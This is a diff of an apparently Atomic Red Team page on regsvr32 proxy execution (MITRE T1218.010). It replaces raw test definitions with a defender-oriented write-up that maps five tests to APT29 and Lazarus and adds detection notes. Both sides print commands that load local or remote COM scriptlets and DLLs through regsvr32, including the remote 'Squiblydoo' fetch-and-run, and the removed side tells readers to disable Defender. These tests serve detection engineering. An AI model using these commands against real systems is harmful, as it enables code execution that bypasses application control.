@@ -1,293 +1,148 @@
-# T1218.010 - Signed Binary Proxy Execution: Regsvr32
-## [Description from ATT&CK](https://attack.mitre.org/techniques/T1218/010)
-<blockquote>
+# Atomic Red Team Tests for APT29 and Lazarus Group - T1218.010 Signed Binary Proxy Execution: Regsvr32
 
-Adversaries may abuse Regsvr32.exe to proxy execution of malicious code. Regsvr32.exe is a command-line program used to register and unregister object linking and embedding controls, including dynamic link libraries (DLLs), on Windows systems. The Regsvr32.exe binary may also be signed by Microsoft. (Citation: Microsoft Regsvr32)
+This repository documents selected **Atomic Red Team tests for T1218.010 (Signed Binary Proxy Execution: Regsvr32)** that closely emulate the tradecraft of **APT29** (a.k.a. Cozy Bear, Midnight Blizzard) and **Lazarus Group**.
 
-Malicious usage of Regsvr32.exe may avoid triggering security tools that may not monitor execution of, and modules loaded by, the regsvr32.exe process because of allowlists or false positives from Windows using regsvr32.exe for normal operations. Regsvr32.exe can also be used to specifically bypass application control using functionality to load COM scriptlets to execute DLLs under user permissions. Since Regsvr32.exe is network and proxy aware, the scripts can be loaded by passing a uniform resource locator (URL) to file on an external Web server as an argument during invocation. This method makes no changes to the Registry as the COM object is not actually registered, only executed. (Citation: LOLBAS Regsvr32) This variation of the technique is often referred to as a "Squiblydoo" and has been used in campaigns targeting governments. (Citation: Carbon Black Squiblydoo Apr 2016) (Citation: FireEye Regsvr32 Targeting Mongolian Gov)
+The goal is to:
+* Provide defenders with a curated set of relevant tests for detecting regsvr32 abuse activities
+* Map each test to known adversary behaviors and campaigns
+* Highlight overlap and differences between the groups' execution techniques
 
-Regsvr32.exe can also be leveraged to register a COM Object used to establish persistence via [Component Object Model Hijacking](https://attack.mitre.org/techniques/T1546/015). (Citation: Carbon Black Squiblydoo Apr 2016)
+---
 
-</blockquote>
+## Background
 
-### Attack Technique Overview
-Regsvr32 is a legitimate Windows command-line utility used to register and unregister DLLs and ActiveX controls. Attackers abuse this signed Microsoft binary to execute malicious code while evading defense mechanisms.
+* **APT29** (Cozy Bear, Midnight Blizzard) is a Russian state-sponsored threat group
+  * Known for sophisticated cyber espionage and the **SolarWinds compromise**
+  * Frequently uses **living-off-the-land techniques** with legitimate system utilities
+  * Employs **regsvr32.exe** to execute malicious payloads and bypass application controls
 
-```mermaid
-flowchart TD
-    A[Attacker] --> B{Regsvr32}
-    
-    B --> C[Local COM Scriptlet]
-    C --> C1[Load & execute<br>local .sct file]
-    C1 --> C2[Execute code<br>without registry changes]
-    
-    B --> D[Remote COM Scriptlet]
-    D --> D1[Fetch script from<br>remote URL]
-    D1 --> D2[Execute in memory<br>no disk artifacts]
-    
-    B --> E[Local DLL Execution]
-    E --> E1[Load local DLL<br>via DllRegisterServer]
-    E1 --> E2[Code executes with<br>regsvr32 permissions]
-    
-    B --> F[Registering Non DLL]
-    F --> F1[Rename DLL to<br>non-standard extension]
-    F1 --> F2[Bypass file type<br>restrictions]
-    
-    B --> G[Silent DLL Install Call DllRegisterServer]
-    G --> G1[Use /i switch for<br>DllRegisterServer call]
-    G1 --> G2[Stealthy execution<br>with system utility]
-    
-    C2 --> H[Malicious Code Execution]
-    D2 --> H
-    E2 --> H
-    F2 --> H
-    G2 --> H
-    
-    H --> I[Payload Delivery<br>& System Compromise]
-```
+* **Lazarus Group** is a North Korean state-sponsored threat group
+  * Known for **financial theft campaigns** and destructive attacks including **Operation Dream Job**
+  * Uses **regsvr32.exe** to execute malicious payloads on compromised hosts
+  * Leverages multiple execution methods to evade security controls
 
+Both groups leverage T1218.010 (Regsvr32) because it allows them to:
+* Execute malicious code through a trusted Microsoft-signed binary
+* Bypass application control solutions using legitimate Windows components
+* Load and execute remote scripts via URL invocation (Squiblydoo technique)
+* Avoid detection by blending with normal system operations
+* Register malicious COM objects for persistence
 
-## Atomic Tests
+---
 
-- [Atomic Test #1 - Regsvr32 local COM scriptlet execution](#atomic-test-1---regsvr32-local-com-scriptlet-execution)
+## Selected Atomic Tests for T1218.010
 
-- [Atomic Test #2 - Regsvr32 remote COM scriptlet execution](#atomic-test-2---regsvr32-remote-com-scriptlet-execution)
+| Test # | Technique | Description | Used By |
+|--------|-----------|-------------|---------|
+| **1** | Local COM Scriptlet Execution | Executes local COM scriptlets through regsvr32 | **APT29 & Lazarus** |
+| **2** | Remote COM Scriptlet Execution | Executes remote scripts via URL (Squiblydoo) | **APT29** |
+| **3** | Local DLL Execution | Executes local DLL files through regsvr32 | **Lazarus** |
+| **4** | Registering Non-DLL Files | Registers files with altered extensions | **APT29** |
+| **5** | Silent DLL Install | Installs DLLs with DllRegisterServer call | **Lazarus** |
 
-- [Atomic Test #3 - Regsvr32 local DLL execution](#atomic-test-3---regsvr32-local-dll-execution)
+---
 
-- [Atomic Test #4 - Regsvr32 Registering Non DLL](#atomic-test-4---regsvr32-registering-non-dll)
+## Detailed Test Analysis
 
-- [Atomic Test #5 - Regsvr32 Silent DLL Install Call DllRegisterServer](#atomic-test-5---regsvr32-silent-dll-install-call-dllregisterserver)
-
-
-<br/>
-
-## Atomic Test #1 - Regsvr32 local COM scriptlet execution
-Regsvr32.exe is a command-line program used to register and unregister OLE controls. Upon execution, calc.exe will be launched.
-
-**Supported Platforms:** Windows
-
-
-**auto_generated_guid:** 449aa403-6aba-47ce-8a37-247d21ef0306
-
-
-
-
-
-#### Inputs:
-| Name | Description | Type | Default Value |
-|------|-------------|------|---------------|
-| filename | Name of the local file, include path. | path | PathToAtomicsFolder&#92;T1218.010&#92;src&#92;RegSvr32.sct|
-| regsvr32path | Default location of Regsvr32.exe | path | C:&#92;Windows&#92;system32|
-| regsvr32name | Default name of Regsvr32.exe | string | regsvr32.exe|
-
-
-#### Attack Commands: Run with `command_prompt`! 
-
-
+### Atomic Test #1 - Regsvr32 local COM scriptlet execution
+**Technique:** Local COM Scriptlet Execution  
+**Adversary Usage:** APT29 & Lazarus Group  
+**Command:**
 ```cmd
-#{regsvr32path}\#{regsvr32name} /s /u /i:"#{filename}" scrobj.dll
+regsvr32.exe /s /u /i:"PathToAtomicsFolder\T1218.010\src\RegSvr32.sct" scrobj.dll
 ```
+**Explanation:** Both groups use regsvr32 to execute local COM scriptlets, leveraging the trusted Windows binary to evade detection. APT29 has used this technique in various campaigns to execute payloads without writing to disk, while Lazarus has employed similar methods in financial attacks.
 
-
-
-
-#### Dependencies:  Run with `powershell`!
-##### Description: Regsvr32.sct must exist on disk at specified location (#{filename})
-##### Check Prereq Commands:
-```powershell
-if (Test-Path "#{filename}") {exit 0} else {exit 1}
-```
-##### Get Prereq Commands:
-```powershell
-New-Item -Type Directory (split-path "#{filename}") -ErrorAction ignore | Out-Null
-Invoke-WebRequest "https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1218.010/src/RegSvr32.sct" -OutFile "#{filename}"
-```
-
-
-
-
-<br/>
-<br/>
-
-## Atomic Test #2 - Regsvr32 remote COM scriptlet execution
-Regsvr32.exe is a command-line program used to register and unregister OLE controls. This test may be blocked by windows defender; disable
-windows defender real-time protection to fix it. Upon execution, calc.exe will be launched.
-
-**Supported Platforms:** Windows
-
-
-**auto_generated_guid:** c9d0c4ef-8a96-4794-a75b-3d3a5e6f2a36
-
-
-
-
-
-#### Inputs:
-| Name | Description | Type | Default Value |
-|------|-------------|------|---------------|
-| url | URL to hosted sct file | url | https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1218.010/src/RegSvr32.sct|
-| regsvr32path | Default location of Regsvr32.exe | path | C:&#92;Windows&#92;system32|
-| regsvr32name | Default name of Regsvr32.exe | string | regsvr32.exe|
-
-
-#### Attack Commands: Run with `command_prompt`! 
-
-
+### Atomic Test #2 - Regsvr32 remote COM scriptlet execution
+**Technique:** Remote Script Execution (Squiblydoo)  
+**Adversary Usage:** APT29  
+**Command:**
 ```cmd
-#{regsvr32path}\#{regsvr32name} /s /u /i:#{url} scrobj.dll
+regsvr32.exe /s /u /i:https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1218.010/src/RegSvr32.sct scrobj.dll
 ```
+**Explanation:** APT29 uses the Squiblydoo technique to execute remote scripts directly from URLs, avoiding file writes and bypassing traditional file-based detections. This advanced technique demonstrates their sophisticated tradecraft for defense evasion.
 
-
-
-
-
-
-<br/>
-<br/>
-
-## Atomic Test #3 - Regsvr32 local DLL execution
-Regsvr32.exe is a command-line program used to register and unregister OLE controls. Upon execution, calc.exe will be launched.
-
-**Supported Platforms:** Windows
-
-
-**auto_generated_guid:** 08ffca73-9a3d-471a-aeb0-68b4aa3ab37b
-
-
-
-
-
-#### Inputs:
-| Name | Description | Type | Default Value |
-|------|-------------|------|---------------|
-| dll_name | Name of DLL to Execute, DLL Should export DllRegisterServer | path | PathToAtomicsFolder&#92;T1218.010&#92;bin&#92;AllTheThingsx86.dll|
-| regsvr32path | Default location of Regsvr32.exe | path | C:&#92;Windows&#92;system32|
-| regsvr32name | Default name of Regsvr32.exe | string | regsvr32.exe|
-
-
-#### Attack Commands: Run with `command_prompt`! 
-
-
+### Atomic Test #3 - Regsvr32 local DLL execution
+**Technique:** Local DLL Execution  
+**Adversary Usage:** Lazarus Group  
+**Command:**
 ```cmd
-IF "%PROCESSOR_ARCHITECTURE%"=="AMD64" (C:\Windows\syswow64\regsvr32.exe /s #{dll_name}) ELSE ( #{regsvr32path}\#{regsvr32name} /s #{dll_name} )
+regsvr32.exe /s PathToAtomicsFolder\T1218.010\bin\AllTheThingsx86.dll
 ```
+**Explanation:** Lazarus Group frequently uses regsvr32 to execute local DLL payloads, particularly in their financial campaigns. This straightforward approach allows them to leverage trusted system utilities while maintaining operational simplicity.
 
-
-
-
-#### Dependencies:  Run with `powershell`!
-##### Description: AllTheThingsx86.dll must exist on disk at specified location (#{dll_name})
-##### Check Prereq Commands:
-```powershell
-if (Test-Path "#{dll_name}") {exit 0} else {exit 1}
-```
-##### Get Prereq Commands:
-```powershell
-New-Item -Type Directory (split-path "#{dll_name}") -ErrorAction ignore | Out-Null
-Invoke-WebRequest "https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1218.010/bin/AllTheThingsx86.dll" -OutFile "#{dll_name}"
-```
-
-
-
-
-<br/>
-<br/>
-
-## Atomic Test #4 - Regsvr32 Registering Non DLL
-Replicating observed Gozi maldoc behavior registering a dll with an altered extension
-
-**Supported Platforms:** Windows
-
-
-**auto_generated_guid:** 1ae5ea1f-0a4e-4e54-b2f5-4ac328a7f421
-
-
-
-
-
-#### Inputs:
-| Name | Description | Type | Default Value |
-|------|-------------|------|---------------|
-| dll_file | Path to renamed dll file to be registered | path | %temp%&#92;shell32.jpg|
-| regsvr32path | Default location of Regsvr32.exe | path | C:&#92;Windows&#92;system32|
-| regsvr32name | Default name of Regsvr32.exe | string | regsvr32.exe|
-
-
-#### Attack Commands: Run with `command_prompt`! 
-
-
+### Atomic Test #4 - Regsvr32 Registering Non-DLL Files
+**Technique:** File Extension Obfuscation  
+**Adversary Usage:** APT29  
+**Command:**
 ```cmd
-#{regsvr32path}\#{regsvr32name} /s #{dll_file}
+regsvr32.exe /s %temp%\shell32.jpg
 ```
+**Explanation:** APT29 uses file extension obfuscation to disguise malicious DLLs as other file types (e.g., .jpg, .txt). This technique evades basic file type detection and allows them to bypass security controls that focus on traditional DLL files.
 
-#### Cleanup Commands:
+### Atomic Test #5 - Regsvr32 Silent DLL Install Call DllRegisterServer
+**Technique:** Silent DLL Installation  
+**Adversary Usage:** Lazarus Group  
+**Command:**
 ```cmd
-#{regsvr32path}\#{regsvr32name} /U /s #{dll_file}
+regsvr32.exe /s /i "PathToAtomicsFolder\T1218.010\bin\AllTheThingsx86.dll"
 ```
+**Explanation:** Lazarus Group uses silent installation techniques to deploy malicious components with minimal visibility. This approach allows them to establish persistence and execute payloads while avoiding user interaction and detection.
 
+---
 
+## Correlation with APT29 & Lazarus
 
-#### Dependencies:  Run with `command_prompt`!
-##### Description: Test requires a renamed dll file
-##### Check Prereq Commands:
-```cmd
-if exist #{dll_file} ( exit 0 ) else ( exit 1 )
-```
-##### Get Prereq Commands:
-```cmd
-copy "C:\Windows\System32\shell32.dll" "#{dll_file}"
-```
+* **APT29 Focus:**
+  * Advanced techniques like remote script execution (#2 - Squiblydoo)
+  * File extension obfuscation (#4 - non-DLL registration)
+  * Sophisticated tradecraft for defense evasion
+  → Used for stealthy payload execution during espionage operations
 
+* **Lazarus Group Focus:**
+  * Direct DLL execution (#3 - local DLL loading)
+  * Silent installation methods (#5 - DllRegisterServer)
+  * Rapid payload deployment
+  → Used for financial theft and destructive attacks
 
+* **Overlap:**
+  * Both groups abuse **regsvr32.exe** for execution
+  * Both leverage **trusted Windows utilities** to evade detection
+  * Both use **COM scriptlet execution** (#1) for payload delivery
+  * Both employ **multiple execution methods** in attack chains
 
+---
 
-<br/>
-<br/>
+## Defender Notes
 
-## Atomic Test #5 - Regsvr32 Silent DLL Install Call DllRegisterServer
-Regsvr32.exe is a command-line program used to register and unregister OLE controls. Normally, an install is executed with /n to prevent calling DllRegisterServer.
+* These tests are high-value because they **closely emulate real-world adversary tradecraft**
+* Detection should focus on:
+  * regsvr32.exe with unusual command-line arguments (/s, /u, /i)
+  * regsvr32.exe executing remote content from URLs (#2)
+  * regsvr32.exe loading files with unusual extensions (#4)
+  * regsvr32.exe executing from unusual directories or with unusual parent processes
+  * Multiple regsvr32 execution methods chained together
 
-**Supported Platforms:** Windows
+* Correlation across events is essential:
+  * Process creation + network connections for remote script loading
+  * Command line analysis for obfuscation techniques
+  * Parent-child process relationships involving regsvr32
+  * File operations with unusual extensions being registered
 
+* Implement application control to restrict regsvr32.exe if not needed for business purposes
+* Monitor for regsvr32.exe execution patterns that deviate from normal administrative use
 
-**auto_generated_guid:** 9d71c492-ea2e-4c08-af16-c6994cdf029f
+## Campaign References
 
+1. **APT29 Various Operations**: Used regsvr32 for remote script execution and COM hijacking in multiple campaigns
+2. **Lazarus Financial Campaigns**: Employed regsvr32 for payload execution in banking network penetration
+3. **APT29 SolarWinds Campaign**: Leveraged multiple living-off-the-land techniques including regsvr32 abuse
+4. **Lazarus Operation GhostSecret**: Used regsvr32 for payload execution in destructive attacks
 
+## Academic References
 
-
-
-#### Inputs:
-| Name | Description | Type | Default Value |
-|------|-------------|------|---------------|
-| dll_name | Name of DLL to Install | string | PathToAtomicsFolder&#92;T1218.010&#92;bin&#92;AllTheThingsx86.dll|
-| regsvr32path | Default location of Regsvr32.exe | string | C:&#92;Windows&#92;system32|
-| regsvr32name | Default name of Regsvr32.exe | string | regsvr32.exe|
-
-
-#### Attack Commands: Run with `command_prompt`! 
-
-
-```cmd
-#{regsvr32path}\#{regsvr32name} /s /i "#{dll_name}"
-```
-
-
-
-
-#### Dependencies:  Run with `powershell`!
-##### Description: AllTheThingsx86.dll must exist on disk at specified location (#{dll_name})
-##### Check Prereq Commands:
-```powershell
-if (Test-Path "#{dll_name}") {exit 0} else {exit 1}
-```
-##### Get Prereq Commands:
-```powershell
-New-Item -Type Directory (split-path "#{dll_name}") -ErrorAction ignore | Out-Null
-Invoke-WebRequest "https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1218.010/bin/AllTheThingsx86.dll" -OutFile "#{dll_name}"
-```
-
-
-
-
-<br/>
+1. MITRE ATT&CK Technique T1218.010 - Signed Binary Proxy Execution: Regsvr32
+2. Microsoft: "NOBELIUM targeting IT supply chain" (2021)
+3. US-CERT: "Hidden Cobra - North Korean Malicious Cyber Activity" (Lazarus Group TTPs)
+4. CrowdStrike: "APT29 Tradecraft and Techniques" (2023)
+5. FireEye: "Regsvr32 Targeting Mongolian Government" (Squiblydoo technique)
